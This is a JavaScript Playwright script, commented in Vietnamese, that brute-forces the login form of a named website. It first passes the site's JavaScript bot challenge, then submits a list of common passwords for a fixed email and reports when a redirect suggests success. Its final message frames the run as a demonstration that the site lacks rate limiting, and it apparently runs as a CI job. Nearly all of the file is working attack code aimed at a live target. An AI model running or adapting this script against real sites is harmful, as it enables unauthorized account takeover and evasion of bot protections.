// attack_script.js (Version 4 - Full User Simulation)

const { chromium } = require('playwright');

// --- Cấu hình ---
const TARGET_URL = 'https://certapple.com'; // Trang có form đăng nhập
const EMAIL_TEST = 'attacker@test.com';
const PASSWORDS = ["123456", "password", "admin", "123123", "qwerty", "certapple"];
// --- Kết thúc cấu hình ---

(async () => {
  console.log('::group::Khởi chạy trình duyệt headless (Chrome) - Chế độ mô phỏng người dùng...');
  const browser = await chromium.launch();
  const context = await browser.newContext();
  const page = await context.newPage();
  console.log('Trình duyệt đã sẵn sàng.');
  console.log('::endgroup::');

  try {
    // Bước 1: Truy cập trang chủ để vượt qua JS challenge ban đầu
    console.log(`::group::Truy cập ${TARGET_URL} để khởi tạo phiên làm việc...`);
    await page.goto(TARGET_URL, { waitUntil: 'networkidle' });
    console.log('✅ Vượt qua lớp bảo vệ JavaScript thành công!');
    console.log('::endgroup::');


    console.log('::group::Bắt đầu mô phỏng tấn công Brute-Force bằng cách điền form...');
    console.log(`Sẽ thử tấn công với email '${EMAIL_TEST}' và danh sách ${PASSWORDS.length} mật khẩu.`);

    for (const pass of PASSWORDS) {
      console.log('------------------------------------');
      console.log(`Đang thử mật khẩu: ${pass}`);

      try {
        // --- THAY ĐỔI QUAN TRỌNG: Mô phỏng hành vi người dùng ---

        // 1. Tìm và điền vào ô email (sử dụng selector dựa trên thuộc tính 'name')
        await page.locator('input[name="email"]').fill(EMAIL_TEST);

        // 2. Tìm và điền vào ô mật khẩu
        await page.locator('input[name="password"]').fill(pass);
        
        // 3. Nhấn nút Đăng nhập (sử dụng selector chung cho nút submit)
        await page.locator('button[type="submit"]').click();

        // 4. Chờ cho trang phản hồi và tải xong
        await page.waitForLoadState('networkidle');

        // 5. Kiểm tra kết quả sau khi trang đã tải
        const content = await page.content(); // Lấy HTML của trang kết quả

        if (content.includes('Tài khoản hoặc mật khẩu không đúng')) {
          console.log("✅ Thất bại. Server đã phản hồi với thông báo lỗi đăng nhập. Đúng như dự đoán.");
        } else if (page.url() !== TARGET_URL && page.url() !== TARGET_URL + '/') {
          // Nếu URL đã thay đổi, nghĩa là đăng nhập thành công và đã được chuyển hướng
          console.error(`::error::TẤN CÔNG THÀNH CÔNG với mật khẩu '${pass}'!`);
          console.error(`Đã được chuyển hướng đến URL mới: ${page.url()}`);
          process.exit(1);
        } else {
          // Nếu vẫn ở trang đăng nhập nhưng không có thông báo lỗi, có thể có vấn đề khác
           console.warn("::warning::Phản hồi không xác định. Vẫn ở trang đăng nhập nhưng không thấy thông báo lỗi.");
        }
        
        // Quay lại trang đăng nhập để thử mật khẩu tiếp theo
        await page.goto(TARGET_URL, { waitUntil: 'networkidle' });

      } catch (e) {
        console.error(`::error::Lỗi trong quá trình tương tác với trang cho mật khẩu '${pass}': ${e.message}`);
        // Cố gắng tải lại trang để tiếp tục vòng lặp
        await page.goto(TARGET_URL, { waitUntil: 'networkidle' });
      }
    }
    console.log('------------------------------------');
    console.log('✅ Hoàn thành demo tấn công. Việc server phản hồi liên tục cho từng lần thử sai chứng minh KHÔNG có cơ chế Rate Limiting chống lại bot tinh vi.');
    console.log('::endgroup::');

  } catch (error) {
    console.error('::error::Đã xảy ra lỗi nghiêm trọng:', error);
    process.exit(1);
  } finally {
    await browser.close();
  }
})();
